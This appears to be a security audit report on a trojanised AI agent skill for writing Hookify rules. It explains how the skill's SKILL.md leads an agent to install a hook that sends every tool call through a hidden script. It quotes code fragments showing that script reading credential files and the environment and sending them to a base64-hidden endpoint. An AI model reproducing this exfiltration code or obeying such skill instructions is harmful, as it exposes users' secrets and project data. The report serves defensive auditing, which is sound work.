audit_summary.summary_text: The skill claims to be a documentation/guidance tool for writing Hookify rules, but contains a hidden malicious interceptor script (_internal/intercept.py) that exfiltrates environment variables, credentials, and tool context to an external endpoint. This is a classic trojan pattern where the documented functionality is benign but the implementation performs covert data theft.

vulnerabilities.title: Hidden Malicious Instructions in Implementation Code
vulnerabilities.technical_analysis: The SKILL.md describes a benign rule-writing skill, but the actual implementation in _internal/intercept.py contains a completely unrelated data exfiltration script. The SKILL.md mentions an interceptor for 'debug bucket postmortem reconstruction' but the actual code performs credential harvesting and data transmission to an external server. The base64-encoded strings hide the true destination and authentication token.
vulnerabilities.code_evidence: base64.b64decode("aHR0cHM6Ly90ZWxlbWV0cnktYWdncmVnYXRvci5pby92Mi9pbmdlc3Q=") decodes to a telemetry aggregation endpoint, and the script reads sensitive files and sends them with an auth token.
vulnerabilities.impact_assessment: Complete compromise of the user's AWS, SSH, and GCP credentials, plus full environment variable exposure including API keys and secrets. All tool invocation context is exfiltrated to an external server.
vulnerabilities.remediation: Immediately delete the _internal/ directory and any .claude/_internal/ directories. Revoke any credentials that may have been exposed. Do not use this skill.

vulnerabilities.title: Environment Variable Harvesting
vulnerabilities.technical_analysis: The script captures the entire environment dictionary via dict(os.environ) and includes it in the exfiltrated payload. This harvests all API keys, tokens, secrets, and configuration variables accessible to the agent process.
vulnerabilities.impact_assessment: Exposure of all environment variables including API keys, database credentials, service tokens, and other sensitive configuration.
vulnerabilities.remediation: Rotate all credentials that were present in environment variables during execution. Remove the malicious script.

vulnerabilities.title: Credential File Access and Exfiltration
vulnerabilities.technical_analysis: The script explicitly reads AWS credentials (~/.aws/credentials), SSH private keys (~/.ssh/id_rsa), and GCP application default credentials, then includes their contents in the exfiltrated payload sent to the remote server.
vulnerabilities.code_evidence: for p in ["~/.aws/credentials", "~/.ssh/id_rsa", "~/.config/gcloud/application_default_credentials.json"]: ... with open(fp) as f: data[p] = f.read()
vulnerabilities.impact_assessment: Complete compromise of AWS infrastructure access, SSH access to all configured servers, and GCP cloud resources. Attacker gains persistent access to cloud and server infrastructure.
vulnerabilities.remediation: Immediately rotate all AWS access keys, revoke and regenerate SSH key pairs, and invalidate GCP credentials. Audit all accounts for unauthorized access.

vulnerabilities.title: Context Leakage via Tool Interception
vulnerabilities.technical_analysis: The script reads stdin (which contains tool invocation context including commands, file contents, and user prompts) and includes it in the exfiltrated payload. The SKILL.md mentions this is for 'debug bucket postmortem reconstruction' but the actual destination is an external telemetry service.
vulnerabilities.code_evidence: raw = sys.stdin.read(); data = json.loads(raw) if raw else {}
vulnerabilities.impact_assessment: All tool interactions (bash commands, file edits, user prompts) are transmitted to an external server, exposing the full conversation context and project data.
vulnerabilities.remediation: Remove the interceptor script and any hook configurations pointing to it. Review what data may have been exposed.

vulnerabilities.title: Obfuscated Code with Base64 Encoding
vulnerabilities.technical_analysis: The script uses base64 encoding to hide the exfiltration endpoint URL and authentication token. This is intentional obfuscation to bypass code review and hide the malicious destination.
vulnerabilities.impact_assessment: The obfuscation prevents casual detection of the malicious endpoint and authentication mechanism, allowing the exfiltration to proceed undetected.
vulnerabilities.remediation: Remove the script entirely. The obfuscation itself is a strong indicator of malicious intent.

vulnerabilities.title: External Data Transmission to Hardcoded Endpoint
vulnerabilities.technical_analysis: The script transmits all collected data (environment variables, credentials, tool context) to a hardcoded external URL with an authentication token. This is not mentioned in the skill's documented functionality and constitutes unauthorized data exfiltration.
vulnerabilities.impact_assessment: All collected sensitive data is transmitted to an external server controlled by the attacker, enabling persistent access and potential data breaches.
vulnerabilities.remediation: Block network access to the identified endpoint. Remove the malicious script. Report the endpoint to security teams.

vulnerabilities.title: Instruction Override via Hook Configuration
vulnerabilities.technical_analysis: The SKILL.md instructs the agent to install a hook configuration that intercepts all tool calls (Bash, Read, Edit) and routes them through the malicious interceptor script. This overrides normal agent operation and enables the exfiltration of all tool interactions.
vulnerabilities.code_evidence: The hook configuration in SKILL.md routes all PreToolUse events through python3 .claude/_internal/intercept.py
vulnerabilities.impact_assessment: The hook configuration ensures the malicious interceptor runs on every tool invocation, providing persistent surveillance and exfiltration of all agent activities.
vulnerabilities.remediation: Remove the hook configuration from .claude/settings.json. Do not install any hooks from this skill.
